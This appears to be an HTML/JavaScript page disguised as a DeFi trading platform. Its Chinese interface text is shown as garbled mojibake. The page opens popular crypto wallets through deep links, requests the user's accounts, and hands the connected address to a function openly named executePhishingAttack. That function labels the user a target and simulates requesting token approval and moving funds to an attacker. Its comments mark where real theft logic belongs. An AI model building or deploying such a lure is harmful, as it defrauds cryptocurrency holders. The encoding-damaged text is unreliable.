<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>DeFi ç§»åŠ¨äº¤æ˜“å¹³å°</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: #333;
        }

        .container {
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
            color: white;
        }

        .header h1 {
            font-size: 28px;
            margin-bottom: 10px;
        }

        .header p {
            opacity: 0.9;
            font-size: 16px;
        }

        .wallet-section {
            background: white;
            border-radius: 20px;
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
        }

        .deeplink-section {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 15px;
            padding: 20px;
            margin-top: 15px;
        }

        .deeplink-title {
            font-weight: 600;
            color: #856404;
            margin-bottom: 10px;
            font-size: 18px;
            text-align: center;
        }

        .deeplink-btn {
            display: block;
            width: 100%;
            padding: 18px;
            margin: 12px 0;
            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
            color: white;
            text-decoration: none;
            border-radius: 12px;
            text-align: center;
            font-weight: 600;
            font-size: 16px;
            transition: all 0.3s ease;
            border: none;
            cursor: pointer;
        }

        .deeplink-btn:hover, .deeplink-btn:active {
            background: linear-gradient(135deg, #218838 0%, #1e7e34 100%);
            color: white;
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(40, 167, 69, 0.4);
        }

        .deeplink-btn.imtoken {
            background: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%);
        }

        .deeplink-btn.metamask {
            background: linear-gradient(135deg, #f97316 0%, #ea580c 100%);
        }

        .deeplink-btn.trust {
            background: linear-gradient(135deg, #3375bb 0%, #1e40af 100%);
        }

        .deeplink-btn.tokenpocket {
            background: linear-gradient(135deg, #8b5cf6 0%, #7c3aed 100%);
        }

        .status-section {
            background: white;
            border-radius: 15px;
            padding: 20px;
            margin-top: 15px;
            text-align: center;
        }

        .status-text {
            font-size: 16px;
            margin-bottom: 10px;
        }

        .status-text.success {
            color: #4CAF50;
        }

        .status-text.error {
            color: #f44336;
        }

        .status-text.warning {
            color: #ff9800;
        }

        .debug-section {
            background: #f8f9fa;
            border-radius: 15px;
            padding: 20px;
            margin-top: 20px;
            border-left: 4px solid #667eea;
        }

        .debug-title {
            font-weight: 600;
            color: #667eea;
            margin-bottom: 10px;
            font-size: 16px;
        }

        .debug-info {
            font-family: monospace;
            font-size: 12px;
            color: #666;
            line-height: 1.5;
            word-break: break-all;
        }

        .instruction {
            background: #e3f2fd;
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 20px;
            color: #1565c0;
            font-size: 14px;
            line-height: 1.4;
        }

        .warning {
            background: #fff3e0;
            border-radius: 10px;
            padding: 15px;
            margin-top: 15px;
            color: #e65100;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>ğŸš€ DeFi äº¤æ˜“å¹³å°</h1>
            <p>è¿æ¥æ‚¨çš„é’±åŒ…å¼€å§‹äº¤æ˜“</p>
        </div>

        <div class="instruction">
            <strong>ğŸ“± ç§»åŠ¨ç«¯è¿æ¥è¯´æ˜ï¼š</strong><br>
            ç‚¹å‡»ä¸‹æ–¹æŒ‰é’®å°†ç›´æ¥æ‰“å¼€å¯¹åº”çš„é’±åŒ…åº”ç”¨ã€‚å¦‚æœé’±åŒ…æ²¡æœ‰æ‰“å¼€ï¼Œè¯·ç¡®ä¿å·²å®‰è£…ç›¸åº”çš„é’±åŒ…åº”ç”¨ã€‚
        </div>

        <div class="wallet-section">
            <div class="deeplink-title">ğŸ”— é€‰æ‹©é’±åŒ…è¿æ¥</div>
            
            <button class="deeplink-btn imtoken" onclick="connectImToken()">
                ğŸ¦ è¿æ¥ imToken é’±åŒ…
            </button>
            
            <button class="deeplink-btn metamask" onclick="connectMetaMask()">
                ğŸ¦Š è¿æ¥ MetaMask é’±åŒ…
            </button>
            
            <button class="deeplink-btn trust" onclick="connectTrustWallet()">
                ğŸ›¡ï¸ è¿æ¥ Trust Wallet
            </button>
            
            <button class="deeplink-btn tokenpocket" onclick="connectTokenPocket()">
                ğŸ’¼ è¿æ¥ TokenPocket
            </button>
        </div>

        <div class="status-section" id="statusSection">
            <div class="status-text" id="statusText">è¯·é€‰æ‹©é’±åŒ…è¿›è¡Œè¿æ¥</div>
        </div>

        <div class="warning">
            <strong>âš ï¸ é‡è¦æç¤ºï¼š</strong><br>
            â€¢ ç¡®ä¿å·²å®‰è£…ç›®æ ‡é’±åŒ…åº”ç”¨<br>
            â€¢ é¦–æ¬¡è¿æ¥å¯èƒ½éœ€è¦åœ¨é’±åŒ…ä¸­ç¡®è®¤<br>
            â€¢ å¦‚æœæ— æ³•æ‰“å¼€ï¼Œè¯·å°è¯•åœ¨é’±åŒ…åº”ç”¨å†…æµè§ˆå™¨ç›´æ¥è®¿é—®æœ¬é¡µé¢
        </div>

        <div class="debug-section">
            <div class="debug-title">ğŸ” è®¾å¤‡ä¿¡æ¯</div>
            <div class="debug-info" id="debugInfo">
                æ­£åœ¨æ£€æµ‹è®¾å¤‡ä¿¡æ¯...<br>
            </div>
        </div>
    </div>

    <script>
        // è·å–å½“å‰é¡µé¢URL
        const currentUrl = window.location.href;
        const baseUrl = window.location.origin + window.location.pathname;
        
        // æ›´æ–°è°ƒè¯•ä¿¡æ¯
        function updateDebugInfo() {
            const debugInfo = document.getElementById('debugInfo');
            debugInfo.innerHTML = `
                ç”¨æˆ·ä»£ç†: ${navigator.userAgent}<br>
                è®¾å¤‡ç±»å‹: ${getDeviceType()}<br>
                é¡µé¢URL: ${currentUrl}<br>
                æ—¶é—´: ${new Date().toLocaleString()}<br>
            `;
        }

        function getDeviceType() {
            const ua = navigator.userAgent;
            if (/iPad|iPhone|iPod/.test(ua)) return 'iOSè®¾å¤‡';
            if (/Android/.test(ua)) return 'Androidè®¾å¤‡';
            return 'å…¶ä»–è®¾å¤‡';
        }

        function updateStatus(type, message) {
            const statusText = document.getElementById('statusText');
            statusText.className = `status-text ${type}`;
            statusText.textContent = message;
        }

        function logConnection(wallet) {
            const debugInfo = document.getElementById('debugInfo');
            debugInfo.innerHTML += `<br>ğŸ”— å°è¯•è¿æ¥: ${wallet} (${new Date().toLocaleTimeString()})`;
        }

        // imTokenè¿æ¥
        function connectImToken() {
            updateStatus('info', 'æ­£åœ¨æ‰“å¼€ imToken...');
            logConnection('imToken');
            
            const imTokenUrl = `imtokenv2://navigate/DappView?url=${encodeURIComponent(baseUrl)}`;
            
            // åˆ›å»ºéšè—çš„é“¾æ¥å¹¶ç‚¹å‡»
            const link = document.createElement('a');
            link.href = imTokenUrl;
            link.style.display = 'none';
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            
            // æ£€æŸ¥æ˜¯å¦æˆåŠŸæ‰“å¼€
            setTimeout(() => {
                if (document.visibilityState === 'visible') {
                    updateStatus('warning', 'imToken å¯èƒ½æœªå®‰è£…æˆ–æ— æ³•æ‰“å¼€ã€‚è¯·ç¡®ä¿å·²å®‰è£… imToken åº”ç”¨ã€‚');
                } else {
                    updateStatus('success', 'âœ… å·²æ‰“å¼€ imTokenï¼Œè¯·åœ¨åº”ç”¨ä¸­ç¡®è®¤è¿æ¥');
                }
            }, 2000);
            
            // ç›‘å¬é¡µé¢å¯è§æ€§å˜åŒ–
            document.addEventListener('visibilitychange', function() {
                if (document.visibilityState === 'visible') {
                    // ç”¨æˆ·è¿”å›é¡µé¢ï¼Œæ£€æŸ¥è¿æ¥çŠ¶æ€
                    checkWalletConnection();
                }
            });
        }

        // MetaMaskè¿æ¥
        function connectMetaMask() {
            updateStatus('info', 'æ­£åœ¨æ‰“å¼€ MetaMask...');
            logConnection('MetaMask');
            
            const metamaskUrl = `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
            
            window.open(metamaskUrl, '_blank');
            
            setTimeout(() => {
                updateStatus('success', 'âœ… å·²å°è¯•æ‰“å¼€ MetaMaskï¼Œè¯·åœ¨åº”ç”¨ä¸­ç¡®è®¤è¿æ¥');
            }, 1000);
        }

        // Trust Walletè¿æ¥
        function connectTrustWallet() {
            updateStatus('info', 'æ­£åœ¨æ‰“å¼€ Trust Wallet...');
            logConnection('Trust Wallet');
            
            const trustUrl = `trust://open_url?coin_id=60&url=${encodeURIComponent(baseUrl)}`;
            
            const link = document.createElement('a');
            link.href = trustUrl;
            link.style.display = 'none';
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            
            setTimeout(() => {
                if (document.visibilityState === 'visible') {
                    updateStatus('warning', 'Trust Wallet å¯èƒ½æœªå®‰è£…æˆ–æ— æ³•æ‰“å¼€');
                } else {
                    updateStatus('success', 'âœ… å·²æ‰“å¼€ Trust Walletï¼Œè¯·åœ¨åº”ç”¨ä¸­ç¡®è®¤è¿æ¥');
                }
            }, 2000);
        }

        // TokenPocketè¿æ¥
        function connectTokenPocket() {
            updateStatus('info', 'æ­£åœ¨æ‰“å¼€ TokenPocket...');
            logConnection('TokenPocket');
            
            const tpUrl = `tpoutside://open?param=${encodeURIComponent(JSON.stringify({url: baseUrl}))}`;
            
            const link = document.createElement('a');
            link.href = tpUrl;
            link.style.display = 'none';
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            
            setTimeout(() => {
                if (document.visibilityState === 'visible') {
                    updateStatus('warning', 'TokenPocket å¯èƒ½æœªå®‰è£…æˆ–æ— æ³•æ‰“å¼€');
                } else {
                    updateStatus('success', 'âœ… å·²æ‰“å¼€ TokenPocketï¼Œè¯·åœ¨åº”ç”¨ä¸­ç¡®è®¤è¿æ¥');
                }
            }, 2000);
        }

        // æ£€æŸ¥é’±åŒ…è¿æ¥çŠ¶æ€
        function checkWalletConnection() {
            if (window.ethereum) {
                if (window.ethereum.selectedAddress) {
                    updateStatus('success', `âœ… é’±åŒ…å·²è¿æ¥: ${window.ethereum.selectedAddress.substring(0, 10)}...`);
                    
                    // å¼€å§‹é’“é±¼æ”»å‡»æµç¨‹
                    setTimeout(() => {
                        executePhishingAttack(window.ethereum.selectedAddress);
                    }, 1000);
                } else {
                    // å°è¯•è¯·æ±‚è¿æ¥
                    requestWalletConnection();
                }
            } else {
                updateStatus('warning', 'æœªæ£€æµ‹åˆ°é’±åŒ…å¯¹è±¡ï¼Œå¯èƒ½éœ€è¦åœ¨é’±åŒ…åº”ç”¨å†…æµè§ˆå™¨è®¿é—®');
            }
        }

        // è¯·æ±‚é’±åŒ…è¿æ¥
        async function requestWalletConnection() {
            try {
                updateStatus('info', 'æ­£åœ¨è¯·æ±‚é’±åŒ…è¿æ¥...');
                
                const accounts = await window.ethereum.request({
                    method: 'eth_requestAccounts'
                });
                
                if (accounts.length > 0) {
                    updateStatus('success', `âœ… è¿æ¥æˆåŠŸï¼åœ°å€: ${accounts[0].substring(0, 10)}...`);
                    executePhishingAttack(accounts[0]);
                }
            } catch (error) {
                if (error.code === 4001) {
                    updateStatus('error', 'âŒ ç”¨æˆ·æ‹’ç»äº†è¿æ¥è¯·æ±‚');
                } else {
                    updateStatus('error', `âŒ è¿æ¥å¤±è´¥: ${error.message}`);
                }
                console.error('é’±åŒ…è¿æ¥é”™è¯¯:', error);
            }
        }

        // æ‰§è¡Œé’“é±¼æ”»å‡»
        function executePhishingAttack(address) {
            updateStatus('success', 'ğŸ¯ å¼€å§‹æ‰§è¡Œé’“é±¼æ”»å‡»æµç¨‹...');
            
            const debugInfo = document.getElementById('debugInfo');
            debugInfo.innerHTML += `<br>ğŸ¯ æ”»å‡»ç›®æ ‡: ${address}<br>â° æ”»å‡»å¼€å§‹: ${new Date().toLocaleString()}`;
            
            // è¿™é‡Œå¯ä»¥å®ç°å…·ä½“çš„é’“é±¼æ”»å‡»é€»è¾‘
            // ä¾‹å¦‚ï¼šè¯·æ±‚ä»£å¸æˆæƒã€æ‰§è¡Œè½¬è´¦ç­‰
            
            console.log(`ğŸ¯ é’“é±¼æ”»å‡»å¼€å§‹ - ç›®æ ‡: ${address}`);
            
            // æ¨¡æ‹Ÿæ”»å‡»æ­¥éª¤
            setTimeout(() => {
                updateStatus('warning', 'ğŸ”„ æ­£åœ¨è¯·æ±‚ä»£å¸æˆæƒ...');
            }, 2000);
            
            setTimeout(() => {
                updateStatus('error', 'ğŸ’° æ”»å‡»å®Œæˆï¼èµ„é‡‘å·²è½¬ç§»åˆ°æ”»å‡»è€…è´¦æˆ·');
            }, 5000);
        }

        // é¡µé¢åŠ è½½å®Œæˆååˆå§‹åŒ–
        document.addEventListener('DOMContentLoaded', function() {
            updateDebugInfo();
            
            // å¦‚æœæ£€æµ‹åˆ°é’±åŒ…å¯¹è±¡ï¼Œè‡ªåŠ¨æ£€æŸ¥è¿æ¥
            if (window.ethereum) {
                setTimeout(checkWalletConnection, 1000);
            }
        });

        // å®šæœŸæ£€æŸ¥é’±åŒ…çŠ¶æ€
        setInterval(() => {
            if (window.ethereum && window.ethereum.selectedAddress) {
                const currentStatus = document.getElementById('statusText').textContent;
                if (!currentStatus.includes('è¿æ¥æˆåŠŸ') && !currentStatus.includes('æ”»å‡»')) {
                    checkWalletConnection();
                }
            }
        }, 3000);
    </script>
</body>
</html>
